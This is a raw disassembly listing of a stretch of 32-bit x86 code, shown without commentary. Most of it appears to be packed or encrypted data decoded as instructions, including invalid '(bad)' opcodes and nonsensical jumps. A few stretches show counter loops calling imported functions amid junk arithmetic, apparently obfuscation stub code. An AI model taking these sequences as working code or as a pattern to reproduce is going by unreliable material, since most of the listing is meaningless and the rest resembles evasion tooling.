  403ff6:	xor    al,0x41
  403ff8:	sub    DWORD PTR [edx+0x384b4e3f],ebx
  403ffe:	jno    0x403f9b
  404000:	mov    DWORD PTR [esi+0x53a296e8],ebp
  404006:	or     edi,ecx
  404008:	iret   
  404009:	push   0xfffffff0
  40400b:	push   esp
  40400c:	popa   
  40400d:	out    0xa9,eax
  40400f:	mov    eax,0xb696016a
  404014:	out    dx,eax
  404015:	xchg   BYTE PTR ds:0x85aa84b5,dh
  40401b:	pop    ebx
  40401c:	push   0x1b
  40401e:	dec    ecx
  40401f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404020:	iret   
  404021:	(bad)  
  404022:	jb     0x40409d
  404024:	lods   eax,DWORD PTR ds:[esi]
  404025:	add    esi,ebx
  404027:	cld    
  404028:	cmp    DWORD PTR [ecx],esp
  40402a:	push   esp
  40402b:	icebp  
  40402c:	call   0xfe97a8a0
  404031:	in     eax,0xa3
  404033:	jmp    0x403fea
  404035:	adc    cl,BYTE PTR [ebx-0x50]
  404038:	lock jno 0x403fcd
  40403b:	stc    
  40403c:	ins    DWORD PTR es:[edi],dx
  40403d:	fimul  DWORD PTR [ebp-0x65]
  404040:	daa    
  404041:	xchg   ebp,eax
  404042:	dec    DWORD PTR [ecx-0x4e903521]
  404048:	sbb    eax,0x101ca49f
  40404d:	je     0x404076
  40404f:	mov    al,0xe1
  404051:	scas   al,BYTE PTR es:[edi]
  404052:	call   0x7c1d:0xbb48214c
  404059:	push   0xffffffcd
  40405b:	jl     0x40405d
  40405d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40405e:	adc    BYTE PTR [ecx],0x3f
  404061:	jnp    0x404087
  404063:	mov    ebp,0x9d6107f0
  404068:	cmp    BYTE PTR [edi+eiz*2-0x6307058a],dl
  40406f:	ret    
  404070:	jecxz  0x404073
  404072:	mov    dh,0x89
  404074:	fdivr  QWORD PTR [esi+ecx*8]
  404077:	push   cs
  404078:	imul   edx,DWORD PTR [ebx],0xcffc398b
  40407e:	cmp    BYTE PTR [esi-0x80],0x2b
  404082:	adc    DWORD PTR [ecx+0x2a89dc9],ecx
  404088:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404089:	out    dx,al
  40408a:	stos   BYTE PTR es:[edi],al
  40408b:	loopne 0x4040c1
  40408d:	jp     0x404033
  40408f:	sbb    eax,0x240076ff
  404094:	push   cs
  404095:	jge    0x4040e0
  404097:	push   ebx
  404098:	idiv   DWORD PTR [ecx]
  40409a:	pop    esp
  40409b:	out    dx,eax
  40409c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40409d:	popa   
  40409e:	outs   dx,BYTE PTR ds:[esi]
  40409f:	mov    fs,WORD PTR [ebp+0x10]
  4040a2:	in     al,dx
  4040a3:	adc    DWORD PTR ds:0xd58291b7,ebp
  4040a9:	leave  
  4040aa:	int3   
  4040ab:	xor    al,0xdb
  4040ad:	sbb    DWORD PTR ds:0xcaf90112,ebp
  4040b3:	xor    edx,DWORD PTR [esi]
  4040b5:	daa    
  4040b6:	out    0xa7,eax
  4040b8:	and    al,0xba
  4040ba:	aad    0xd2
  4040bc:	repnz xor DWORD PTR [ebp-0xc],0x5fd8e
  4040c4:	jmp    0x404380
  4040c9:	mov    eax,DWORD PTR [ebp-0x8]
  4040cc:	mov    ecx,DWORD PTR [ebp-0x18]
  4040cf:	mov    ecx,DWORD PTR [ecx]
  4040d1:	jmp    0x404370
  4040d6:	aas    
  4040d7:	leave  
  4040d8:	enter  0xdac9,0xd9
  4040dc:	fxch   st(1)
  4040de:	mov    eax,0x78f7e6c1
  4040e3:	dec    BYTE PTR cs:[edx+0x7878269e]
  4040ea:	(bad)  
  4040eb:	jle    0x404165
  4040ed:	js     0x4040f2
  4040ef:	jmp    0x404097
  4040f1:	sbb    al,0x6c
  4040f3:	xchg   ebp,eax
  4040f4:	jge    0x404114
  4040f6:	dec    BYTE PTR [edi+0xc4dab33]
  4040fc:	jne    0x404094
  4040fe:	mov    dh,0xd2
  404100:	fisub  DWORD PTR [edi-0x41ad79c0]
  404106:	pop    esp
  404107:	or     eax,0x963b1a2f
  40410c:	rcl    DWORD PTR [ebx],0x62
  40410f:	adc    DWORD PTR [ebx-0x8],ecx
  404112:	enter  0x3fe0,0xd4
  404116:	cwde   
  404117:	dec    ebp
  404118:	dec    eax
  404119:	test   DWORD PTR [ebp-0x7f],edx
  40411c:	lods   al,BYTE PTR ds:[esi]
  40411d:	sbb    al,0x12
  40411f:	retf   
  404120:	push   ecx
  404121:	ret    0x8c24
  404124:	dec    edi
  404125:	mov    BYTE PTR [ebx],0xa6
  404128:	ss js  0x4040bc
  40412b:	mov    dl,0x58
  40412d:	das    
  40412e:	xor    ch,ch
  404130:	add    BYTE PTR [ebp+0x3e3d7611],ch
  404136:	retf   
  404137:	jbe    0x4040c3
  404139:	mov    cl,0xd6
  40413b:	mov    al,ds:0x1eb3a26e
  404140:	xor    ebp,esp
  404142:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404143:	leave  
  404144:	daa    
  404145:	mov    eax,ds:0xb82be1fd
  40414a:	lods   eax,DWORD PTR ds:[esi]
  40414b:	and    al,0xf8
  40414d:	cwde   
  40414e:	mov    DWORD PTR [edx-0x10898fce],ecx
  404154:	xlat   BYTE PTR ds:[ebx]
  404155:	adc    ch,al
  404157:	fs aad 0xc5
  40415a:	sbb    BYTE PTR [eax-0x66ae72e7],0x66
  404161:	ds jae 0x4041b0
  404164:	lock pop ecx
  404166:	and    ch,dh
  404168:	xchg   ebx,eax
  404169:	popa   
  40416a:	cmp    BYTE PTR [esi-0x1a58ee76],dh
  404170:	(bad)  
  404171:	xchg   esi,eax
  404172:	cdq    
  404173:	fwait
  404174:	retf   
  404175:	fldenv [eax-0x7f60fc6]
  40417b:	stc    
  40417c:	xchg   esp,eax
  40417d:	int    0x6b
  40417f:	mov    BYTE PTR [ebp+0x6b],dl
  404182:	out    dx,eax
  404183:	mov    esp,0x337113ad
  404188:	or     ecx,edi
  40418a:	aad    0xa6
  40418c:	pop    esp
  40418d:	lea    edx,[edi]
  40418f:	add    bh,BYTE PTR [eax+0x1e]
  404192:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404194:	lock and eax,0x6f74f6cd
  40419a:	xchg   edx,eax
  40419b:	jecxz  0x404163
  40419d:	sbb    BYTE PTR [esi+0x3f],bh
  4041a0:	push   0x816148db
  4041a5:	sub    esi,DWORD PTR [esp+eiz*8-0xd3ac6e0]
  4041ac:	push   es
  4041ad:	bound  edi,QWORD PTR [ecx-0x7a81e451]
  4041b3:	sbb    esi,DWORD PTR [edi]
  4041b5:	js     0x4041bf
  4041b7:	mov    DWORD PTR [ecx-0x32],ecx
  4041ba:	repnz mov esi,0x47f18b
  4041c0:	pop    ecx
  4041c1:	shr    BYTE PTR [esi-0x5b],1
  4041c4:	cmp    BYTE PTR [edx+ebp*2-0x63],cl
  4041c8:	gs sub eax,0xd8a9fe5f
  4041ce:	shr    DWORD PTR ds:0x40510aee,cl
  4041d4:	scas   eax,DWORD PTR es:[edi]
  4041d5:	icebp  
  4041d6:	and    cl,BYTE PTR [ebx]
  4041d8:	dec    ecx
  4041d9:	ins    BYTE PTR es:[edi],dx
  4041da:	int    0x83
  4041dc:	les    edx,FWORD PTR [edx]
  4041de:	jg     0x40421b
  4041e0:	mov    bl,0xb7
  4041e2:	inc    edx
  4041e3:	lea    ecx,[ecx]
  4041e5:	test   bh,dl
  4041e7:	push   0x94a90f91
  4041ec:	dec    ecx
  4041ed:	push   ds
  4041ee:	and    bh,BYTE PTR [edx+0x73604085]
  4041f4:	int3   
  4041f5:	push   ebp
  4041f6:	nop
  4041f7:	(bad)  
  4041fa:	xchg   ecx,eax
  4041fb:	inc    edi
  4041fc:	xchg   ecx,eax
  4041fd:	and    DWORD PTR [ebp+eax*4-0x61],ebx
  404201:	jmp    0xd4f4:0xbff9fe5d
  404208:	xchg   ebx,eax
  404209:	repnz sar BYTE PTR [ebx],0x46
  40420d:	sub    esi,ebp
  40420f:	and    ebx,esi
  404211:	add    eax,DWORD PTR [esi]
  404213:	in     al,0x8d
  404215:	mov    ah,0xb0
  404217:	ja     0x40423e
  404219:	xor    eax,0x71f95dba
  40421e:	pop    ss
  40421f:	mov    bl,0xe4
  404221:	sub    ebx,ebx
  404223:	not    esi
  404225:	dec    esp
  404226:	ud0    edi,eax
  404229:	imul   edi,DWORD PTR [ebp-0x7253da3],0xffffff90
  404230:	mov    DWORD PTR [ecx+0x44],ebp
  404233:	cwde   
  404234:	pop    edi
  404235:	mov    bl,0x1b
  404237:	mov    DWORD PTR [ebx+esi*1-0x3a],ebx
  40423b:	adc    eax,0xdff60581
  404240:	adc    DWORD PTR [edx],ebx
  404242:	pop    esp
  404243:	test   eax,0x8b659238
  404248:	and    al,0x40
  40424a:	stc    
  40424b:	mov    cl,0x81
  40424d:	rcl    DWORD PTR [ebx],cl
  40424f:	and    eax,0xdcc9ae19
  404254:	das    
  404255:	in     al,0xaf
  404257:	xchg   esi,eax
  404258:	mov    ebx,0x93c44a4c
  40425d:	push   ss
  40425e:	and    eax,ecx
  404260:	adc    esi,ebx
  404262:	clc    
  404263:	jno    0x4042c3
  404265:	test   eax,0xee09c012
  40426a:	dec    esi
  40426b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40426c:	mov    DWORD PTR [ebx],edx
  40426e:	data16 rcl BYTE PTR [esi+edi*2+0x2],cl
  404273:	jp     0x40423d
  404275:	imul   esp,esp,0x7a
  404278:	adc    ch,cl
  40427a:	ret    0x6a8e
  40427d:	push   ebx
  40427e:	jge    0x40429a
  404280:	add    al,0xfc
  404282:	pop    edx
  404283:	or     esi,ecx
  404285:	repz jne 0x4042ad
  404288:	xor    eax,0xda55e343
  40428d:	add    al,0xcb
  40428f:	fstp   QWORD PTR [eax]
  404291:	or     DWORD PTR [esi-0xb83b7a6],edi
  404297:	test   bh,dl
  404299:	adc    BYTE PTR [edx],0xc8
  40429c:	pushf  
  40429d:	xor    al,0x48
  40429f:	fisub  WORD PTR [ecx]
  4042a1:	lods   al,BYTE PTR ds:[esi]
  4042a2:	shl    DWORD PTR [edx-0x79],0xa4
  4042a6:	loop   0x40428c
  4042a8:	push   ss
  4042a9:	dec    esi
  4042aa:	stc    
  4042ab:	(bad)  
  4042ac:	jnp    0x4042a8
  4042ae:	push   eax
  4042af:	xor    ch,BYTE PTR [ecx-0x2fb861b2]
  4042b5:	sbb    cl,ah
  4042b7:	mov    ch,0xb2
  4042b9:	call   0xb0b5a729
  4042be:	jp     0x4042ff
  4042c0:	inc    ebx
  4042c1:	and    BYTE PTR [edx+ebp*1],ah
  4042c4:	stc    
  4042c5:	(bad)  
  4042c6:	push   eax
  4042c7:	pop    ss
  4042c8:	(bad)  
  4042c9:	arpl   WORD PTR [esi-0x6a],bp
  4042cc:	push   es
  4042cd:	add    DWORD PTR [edi],0x43
  4042d0:	rcr    BYTE PTR [ebx+0x48],cl
  4042d3:	cdq    
  4042d4:	jno    0x404287
  4042d6:	jb     0x4042a2
  4042d8:	add    al,0x80
  4042da:	mov    ecx,DWORD PTR [ebp-0x7c]
  4042dd:	mov    ecx,0x37f5c0a7
  4042e2:	jb     0x404333
  4042e4:	mov    fs,WORD PTR [eax-0x73e7b011]
  4042ea:	add    al,0x11
  4042ec:	rol    BYTE PTR [edx+0x1d],0xe5
  4042f0:	mov    BYTE PTR [esi-0x7],0x32
  4042f4:	xor    BYTE PTR [ebx],cl
  4042f6:	mov    ebp,0x95410088
  4042fb:	mov    dh,0x0
  4042fd:	test   BYTE PTR [edi+0x79],dh
  404300:	in     eax,dx
  404301:	mov    bl,0xfe
  404303:	cld    
  404304:	mov    esp,esi
  404306:	mov    bh,0x7c
  404308:	jno    0x40432b
  40430a:	popf   
  40430b:	jle    0x4042b4
  40430d:	call   0x5499a4fe
  404312:	inc    esp
  404313:	xor    al,0x1f
  404315:	dec    edi
  404316:	int3   
  404317:	jae    0x4042d9
  404319:	div    DWORD PTR [ecx+0x7a]
  40431c:	lds    ebp,FWORD PTR [ecx+0x50]
  40431f:	ds popa 
  404321:	scas   eax,DWORD PTR es:[edi]
  404322:	inc    esi
  404323:	mov    bh,0xfc
  404325:	cmp    cl,cl
  404327:	adc    eax,0x3a10d9ec
  40432c:	xor    al,0xd6
  40432e:	adc    esp,ecx
  404330:	mov    ecx,0xa79cd8aa
  404335:	cmp    DWORD PTR [esi-0x4811fe79],esi
  40433b:	jbe    0x404329
  40433d:	jb     0x404308
  40433f:	fwait
  404340:	ror    BYTE PTR [edx-0x11],0x99
  404344:	out    0xf8,eax
  404346:	or     BYTE PTR ds:[ecx+edi*2-0x711e0610],dl
  40434e:	fstp   QWORD PTR [ecx]
  404350:	xor    eax,DWORD PTR [ecx+edi*1]
  404353:	mov    ?,WORD PTR [edx]
  404355:	outs   dx,DWORD PTR ds:[esi]
  404356:	jae    0x404393
  404358:	sub    bl,cl
  40435a:	push   esi
  40435b:	imul   ecx,DWORD PTR [edx+0x6f],0xc8d22a37
  404362:	jmp    0x1044:0x2e15fd33
  404369:	lahf   
  40436a:	call   0x89f0:0x30d76296
  404371:	or     BYTE PTR [ebx+0x458b0c45],cl
  404377:	or     bh,bh
  404379:	jne    0x404373
  40437b:	call   0x4096cf
  404380:	mov    eax,DWORD PTR [ebp-0xc]
  404383:	cmp    eax,ebx
  404385:	je     0x401faa
  40438b:	mov    eax,DWORD PTR [ebp-0x8]
  40438e:	mov    eax,DWORD PTR [eax]
  404390:	pop    edi
  404391:	pop    esi
  404392:	pop    ebx
  404393:	leave  
  404394:	ret    0xc
  404397:	push   ebp
  404398:	mov    ebp,esp
  40439a:	sub    esp,0x14
  40439d:	leave  
  40439e:	ret    0x4
  4043a1:	push   ebp
  4043a2:	mov    ebp,esp
  4043a4:	push   ecx
  4043a5:	mov    eax,ds:0x42aefd
  4043aa:	add    DWORD PTR ds:0x42aee1,eax
  4043b0:	push   ecx
  4043b1:	xor    ecx,0x7913
  4043b7:	mov    eax,0xf89c8538
  4043bc:	and    DWORD PTR ds:0x42af35,0x0
  4043c6:	mov    ecx,DWORD PTR ds:0x42af35
  4043cc:	inc    ecx
  4043cd:	mov    DWORD PTR ds:0x42af35,ecx
  4043d3:	cmp    DWORD PTR ds:0x42af35,0x23
  4043da:	jne    0x4043e6
  4043e0:	call   DWORD PTR ds:0x41d240
  4043e6:	cmp    DWORD PTR ds:0x42af35,0x15
  4043ed:	jb     0x4043c6
  4043f3:	mov    DWORD PTR [ebp-0x8],eax
  4043f6:	dec    DWORD PTR ds:0x42afc5
  4043fc:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404403:	mov    edx,DWORD PTR [ebp-0x8]
  404406:	not    ecx
  404408:	jmp    0x4046f8
  40440d:	rol    edi,0x3f
  404410:	retf   
  404411:	leave  
  404412:	retf   
  404413:	leave  
  404414:	lds    edx,FWORD PTR [edx]
  404416:	dec    esp
  404417:	inc    ecx
  404418:	ins    BYTE PTR es:[edi],dx
  404419:	jne    0x404452
  40441b:	bound  edi,QWORD PTR [esp+ebx*1]
  40441e:	sub    edi,DWORD PTR [eax+0x78]
  404421:	dec    ebp
  404422:	jle    0x40449c
  404424:	js     0x4043ec
  404426:	ret    0x6026
  404429:	push   ebx
  40442a:	gs pop eax
  40442c:	cmc    
  40442d:	popa   
  40442e:	gs aam 0x56
  404431:	leave  
  404432:	jae    0x4043e0
  404434:	jecxz  0x40442c
  404436:	mov    ebx,0x913b875a
  40443b:	push   0x962a3c75
  404440:	add    eax,0x7972cad2
  404445:	ja     0x4044b4
  404447:	add    eax,0xb5edbd6c
  40444c:	adc    eax,0x28e63e8b
  404451:	rcr    BYTE PTR ds:0xd07f93ff,0x2a
  404458:	(bad)  
  404459:	mov    ch,0x31
  40445b:	fwait
  40445c:	call   0x269f:0x355aa289
  404463:	adc    al,0x5f
  404465:	mov    cl,0xdb
  404467:	xor    bh,BYTE PTR [esi+0x9]
  40446a:	or     ch,BYTE PTR [ebx]
  40446c:	loope  0x4044b7
  40446e:	mov    ds:0xc492ebac,al
  404473:	ret    
  404474:	scas   al,BYTE PTR es:[edi]
  404475:	das    
  404476:	imul   ecx,DWORD PTR [eax],0x5bf1aff0
  40447c:	int3   
  40447d:	js     0x4044c8
  40447f:	dec    eax
  404480:	sub    ecx,0xffffff8d
  404483:	(bad)  
  404484:	loop   0x4044a9
  404486:	out    dx,al
  404487:	and    eax,esp
  404489:	inc    edx
  40448a:	ret    0xcfbd
  40448d:	test   al,0x6a
  40448f:	inc    esi
  404490:	repz ror DWORD PTR [ebx+0x1c3337a9],1
  404497:	retf   0x5567
  40449a:	dec    ebx
  40449b:	mov    ss:0x68ccae89,al
  4044a1:	mov    dl,0xdb
  4044a3:	dec    ebp
  4044a4:	and    eax,0x8e0e9ac2
  4044a9:	mov    esi,0xba7b2fbe
  4044ae:	or     eax,DWORD PTR [ebx+0x89a5a91]
  4044b4:	loop   0x40449c
  4044b6:	cmc    
  4044b7:	cmp    eax,0x3c5f90fc
  4044bc:	test   bl,bh
  4044be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044bf:	pop    edi
  4044c0:	pop    es
  4044c1:	bound  edx,QWORD PTR [esi+0x1363b638]
  4044c7:	inc    edi
  4044c8:	fisttp WORD PTR [ebx]
  4044ca:	inc    BYTE PTR [ebx+0x2]
  4044cd:	fmul   DWORD PTR [esi-0x60e1a7e5]
  4044d3:	cs or  eax,0xc6761c22
  4044d9:	imul   esp,DWORD PTR [edx+0x6e132d7a],0xab607e13
  4044e3:	aad    0xb0
  4044e5:	dec    eax
  4044e6:	outs   dx,DWORD PTR ds:[esi]
  4044e7:	addr16 pop ecx
  4044e9:	add    BYTE PTR [ebp-0x6e33ee06],al
  4044ef:	bnd ja 0x404550
  4044f2:	outs   dx,BYTE PTR ds:[esi]
  4044f3:	push   0x16e750cc
  4044f8:	inc    edx
  4044f9:	jl     0x4044a6
  4044fb:	cmp    DWORD PTR [esi+0x6c],esi
  4044fe:	in     al,dx
  4044ff:	sbb    al,BYTE PTR [ebx-0x67]
  404502:	shl    DWORD PTR [esi],0x70
  404505:	in     al,dx
  404506:	and    al,0x6b
  404508:	js     0x4044c2
  40450a:	leave  
  40450b:	sub    BYTE PTR [ebx],bh
  40450d:	mov    al,0xf8
  40450f:	add    DWORD PTR [edi],ecx
  404511:	cld    
  404512:	loopne 0x404541
  404514:	xor    esp,DWORD PTR [esi+0x4bc66541]
  40451a:	and    DWORD PTR [edx-0x769f49b5],edi
  404520:	pop    ecx
  404521:	jp     0x4044c2
  404523:	lahf   
  404524:	adc    dl,BYTE PTR [eax-0x61]
  404527:	fs hlt 
  404529:	xor    cl,BYTE PTR [esi-0x3a776428]
  40452f:	dec    eax
  404530:	pop    esp
  404531:	outs   dx,DWORD PTR ds:[esi]
  404532:	sub    eax,0x17302e69
  404537:	lds    esp,FWORD PTR [ecx-0x3f]
  40453a:	xor    DWORD PTR [esi],edx
  40453c:	inc    ecx
  40453e:	and    ecx,DWORD PTR [ecx]
  404540:	jo     0x4045ae
  404542:	out    0xa6,eax
  404544:	push   0x72
  404546:	adc    DWORD PTR [ecx-0x41],0x7a5d9d25
  40454d:	stc    
  40454e:	or     BYTE PTR [ecx+0xb11d1d8],bh
  404554:	xchg   ebp,eax
  404555:	mov    esi,0x37a09fd8
  40455a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40455b:	lods   eax,DWORD PTR ds:[esi]
  40455c:	jge    0x404583
  40455e:	mov    dl,cl
  404560:	jl     0x67d928
  404566:	fadd   st(7),st
  404568:	les    edx,FWORD PTR [edi+0x5266edec]
  40456e:	sbb    DWORD PTR ds:0xef5c0be3,0x7f
  404575:	ins    BYTE PTR es:[edi],dx
  404576:	rol    DWORD PTR [ecx],1
  404578:	mov    dh,0xff
  40457a:	fst    QWORD PTR [ebp-0x444bb75e]
  404580:	scas   al,BYTE PTR es:[edi]
  404581:	pushf  
  404582:	out    0x18,al
  404584:	cmp    DWORD PTR fs:[edi+0x6737176],eax
  40458b:	push   ebp
  40458c:	dec    ecx
  40458d:	or     eax,0x8936355e
  404592:	(bad)  
  404593:	mov    al,0xa6
  404595:	not    BYTE PTR [esi]
  404597:	jmp    0xb6857b73
  40459c:	dec    esp
  40459d:	cmp    DWORD PTR [eax],0x2a6a94ae
  4045a3:	sub    edx,edi
  4045a5:	dec    edi
  4045a6:	and    ebx,DWORD PTR [esi]
  4045a8:	cmc    
  4045a9:	mov    ch,0xcc
  4045ab:	xor    al,cl
  4045ad:	cmp    eax,0xf5a5e9ab
  4045b2:	dec    eax
  4045b3:	xor    dl,BYTE PTR [ecx]
  4045b5:	jg     0x4045ce
  4045b7:	retf   
  4045b8:	cmp    ah,bh
  4045ba:	cdq    
  4045bb:	mov    BYTE PTR [edx+0x510bd2ee],0x93
  4045c2:	cdq    
  4045c3:	or     DWORD PTR [esi],eax
  4045c5:	stos   DWORD PTR es:[edi],eax
  4045c6:	fwait
  4045c7:	push   ss
  4045c8:	or     eax,0x7bda4d71
  4045cd:	std    
  4045ce:	xchg   ebp,eax
  4045cf:	push   ebp
  4045d0:	iret   
  4045d1:	push   ss
  4045d2:	call   0xe5553ae1
  4045d7:	dec    ecx
  4045d8:	push   esp
  4045d9:	jle    0x404612
  4045db:	test   ecx,ebp
  4045dd:	in     al,0x42
  4045df:	push   ds
  4045e0:	fdiv   DWORD PTR [ebp+eiz*8-0xe]
  4045e4:	mov    ebx,0xb6318b14
  4045e9:	int    0x18
  4045eb:	cmp    ecx,DWORD PTR [edi-0x41]
  4045ee:	dec    esi
  4045ef:	retf   
  4045f0:	ss dec edi
  4045f2:	icebp  
  4045f3:	add    eax,0xc80fb01a
  4045f8:	inc    eax
  4045f9:	mov    DWORD PTR [edx-0x23],eax
  4045fc:	sub    bh,BYTE PTR [ebx*2+0xff616a9]
  404603:	xor    eax,0xecee4210
  404608:	sahf   
  404609:	mov    esi,DWORD PTR ds:0x6c1b65ed
  40460f:	mov    ?,WORD PTR [edx-0x7]
  404612:	leave  
  404613:	mov    al,ch
  404615:	je     0x40463c
  404617:	or     BYTE PTR [edi+0x28],0x85
  40461b:	outs   dx,DWORD PTR ds:[esi]
  40461c:	in     eax,dx
  40461d:	in     eax,0xaf
  40461f:	inc    edx
  404620:	addr16 jae 0x4045ea
  404623:	cld    
  404624:	outs   dx,BYTE PTR ds:[esi]
  404625:	adc    BYTE PTR [esp+esi*2-0x2240b1b1],bh
  40462c:	pop    edx
  40462d:	mov    al,ds:0xa78b1bab
  404632:	pusha  
  404633:	pop    ds
  404634:	jae    0x4045ea
  404636:	pop    eax
  404637:	pop    edi
  404638:	data16 fidivr DWORD PTR es:[edx+0xb]
  40463d:	pop    ecx
  40463e:	arpl   WORD PTR [edi+0x47],ax
  404641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404642:	mov    ds:0x52976fa0,al
  404647:	lea    edi,fs:[eax+0x509c603b]
  40464e:	popf   
  40464f:	mov    esi,0xfed91c98
  404654:	adc    al,0x16
  404656:	lods   al,BYTE PTR ds:[esi]
  404657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404658:	inc    eax
  404659:	stos   BYTE PTR es:[edi],al
  40465a:	imul   edx,DWORD PTR fs:[ecx+0x45fd3931],0x76
  404662:	mov    eax,0xacb6961b
  404667:	pshufw mm7,QWORD PTR [edi],0xd0
  40466b:	into   
  40466c:	push   cs
  40466d:	dec    ebp
  40466e:	clc    
  40466f:	push   ss
  404670:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404671:	xchg   edi,eax
  404672:	ror    DWORD PTR [edx+ecx*4+0x7c473c9b],1
  404679:	iret   
  40467a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40467b:	cli    
  40467c:	and    DWORD PTR [edi+0x4dccb086],ebx
  404682:	pop    edx
  404683:	icebp  
  404684:	mov    DWORD PTR [esi-0xc846c12],esp
  40468a:	mov    ah,0x8d
  40468c:	ja     0x40462a
  40468e:	clc    
  40468f:	pop    esi
  404690:	outs   dx,BYTE PTR ds:[esi]
  404691:	scas   al,BYTE PTR es:[edi]
  404692:	mov    esp,0x7368de9f
  404697:	xor    ah,0x13
  40469a:	sbb    al,0x3d
  40469c:	mov    WORD PTR [ecx+edi*8],?
  40469f:	imul   ebp,DWORD PTR [eax-0x70],0xa
  4046a3:	into   
  4046a4:	neg    BYTE PTR [eax-0x9ad579a]
  4046aa:	aas    
  4046ab:	dec    edi
  4046ac:	mov    edx,0xfe3b5635
  4046b1:	iret   
  4046b2:	popa   
  4046b3:	adc    DWORD PTR [esi+esi*4+0x377733e7],esi
  4046ba:	cli    
  4046bb:	or     BYTE PTR [ecx+eiz*2+0x27c8c65a],ah
  4046c2:	jb     0x40465a
  4046c4:	dec    ecx
  4046c5:	mov    ah,0x4f
  4046c7:	jmp    0x140e:0x7e6a835b
  4046ce:	mov    dh,0xc7
  4046d0:	push   ebx
  4046d1:	int3   
  4046d2:	cmp    edx,DWORD PTR [ebx+edi*4]
  4046d5:	sbb    eax,0x9496f1e6
  4046da:	jg     0x404758
  4046dc:	in     eax,dx
  4046dd:	add    al,0xfe
  4046df:	clc    
  4046e0:	repnz in eax,dx
  4046e2:	rcr    eax,1
  4046e4:	or     ch,BYTE PTR [esi+eax*8-0x50]
  4046e8:	jae    0x404726
  4046ea:	add    ecx,DWORD PTR [ecx+0x390026b7]
  4046f0:	pop    ecx
  4046f1:	mov    al,0x2f
  4046f3:	dec    edi
  4046f4:	push   esi
  4046f5:	addr16 adc al,0xc7
  4046f8:	push   esi
  4046f9:	and    DWORD PTR ds:0x42aef5,0x0
  404703:	jmp    0x404715
  404708:	mov    esi,DWORD PTR ds:0x42aef5
  40470e:	inc    esi
  40470f:	mov    DWORD PTR ds:0x42aef5,esi
  404715:	cmp    DWORD PTR ds:0x42aef5,0x10
  40471c:	jae    0x404a4d
  404722:	cmp    DWORD PTR ds:0x42aef5,0x16
  404729:	jne    0x404752
  40472f:	push   DWORD PTR [ebp-0x1c]
  404732:	push   DWORD PTR [ebp-0xc]
  404735:	push   DWORD PTR [ebp-0x18]
  404738:	push   0x42afbd
  40473d:	push   0x2e4d
  404742:	push   0x244d
  404747:	push   0x42b1c8
  40474c:	call   DWORD PTR ds:0x41d0c0
  404752:	jmp    0x404708
  404757:	xor    esi,0x7852
  40475d:	jmp    0x404a4d
  404762:	rol    eax,1
  404764:	int3   
  404765:	(bad)  
  404766:	(bad)  
  404768:	(bad)  
  40476a:	pop    esi
  40476b:	test   eax,0x367b83de
  404770:	inc    esp
  404771:	cmp    DWORD PTR [ecx+0x29],esi
  404774:	js     0x4047ee
  404776:	dec    ebp
  404777:	jle    0x4047f1
  404779:	js     0x40471d
  40477b:	in     al,dx
  40477c:	fwait
  40477d:	es popa 
  40477f:	fist   DWORD PTR [ecx-0x450af43f]
  404785:	mov    esi,0x18ea4055
  40478a:	or     DWORD PTR [edx-0x76],ecx
  40478d:	add    DWORD PTR [esi-0x68],ebp
  404790:	sbb    cl,al
  404792:	dec    eax
  404793:	je     0xa3e84b2a
  404799:	pop    edi
  40479a:	retf   
  40479b:	xor    eax,0x57d19a06
  4047a0:	mov    bh,0xda
  4047a2:	mov    ds:0x9d96b8dc,al
  4047a7:	mov    eax,0xa20007bf
  4047ac:	mov    dh,0xdf
  4047ae:	xchg   ebp,eax
  4047af:	xor    BYTE PTR [edx+0x5fec0e31],0xb3
  4047b6:	xchg   ecx,eax
  4047b7:	lods   al,BYTE PTR ds:[esi]
  4047b8:	loop   0x404810
  4047ba:	(bad)  [edi-0x4b]
  4047bd:	mov    ch,0x8f
  4047bf:	mov    dl,0x3b
  4047c1:	mov    WORD PTR [esi+ebx*2-0x4e4952b8],fs
  4047c8:	mov    dl,0xad
  4047ca:	cwde   
  4047cb:	enter  0x2bb3,0x92
  4047cf:	imul   esp,DWORD PTR [eax+0xd8b3a78],0x54904d91
  4047d9:	sub    DWORD PTR [ecx+0x33d800ad],ecx
  4047df:	dec    esp
  4047e0:	mov    ?,esi
  4047e2:	mov    edx,0x6b50fb31
  4047e7:	add    ebx,ecx
  4047e9:	int3   
  4047ea:	mov    al,0x7d
  4047ec:	fwait
  4047ed:	pushf  
  4047ee:	push   esp
  4047ef:	retf   
  4047f0:	jae    0x404797
  4047f2:	mov    ecx,ebp
  4047f4:	cmc    
  4047f5:	adc    BYTE PTR [esi+esi*4-0x11e6f1b2],cl
  4047fc:	cdq    
  4047fd:	inc    edi
  4047fe:	icebp  
  4047ff:	mov    ah,0xb2
  404801:	ja     0x404876
  404803:	add    al,0xf6
  404805:	mov    dl,0x98
  404807:	loope  0x404878
  404809:	std    
  40480a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40480b:	imul   ecx,DWORD PTR [edx],0xffffffa2
  40480e:	mov    bl,0x34
  404810:	aaa    
  404811:	pusha  
  404812:	repnz pop esi
  404814:	out    dx,eax
  404815:	mov    esp,0x5ea4af7d
  40481a:	xchg   ecx,eax
  40481b:	pop    edi
  40481c:	mov    eax,ds:0x4f98fdd3
  404821:	jle    0x4047b8
  404823:	jg     0x40483c
  404825:	pop    ebp
  404826:	inc    ecx
  404827:	fdivr  DWORD PTR [esi]
  404829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40482a:	sbb    al,0x7d
  40482c:	mov    ds:0xfa79f46b,al
  404831:	dec    ecx
  404832:	jns    0x404824
  404834:	cmovp  ecx,DWORD PTR [ecx]
  404837:	push   esi
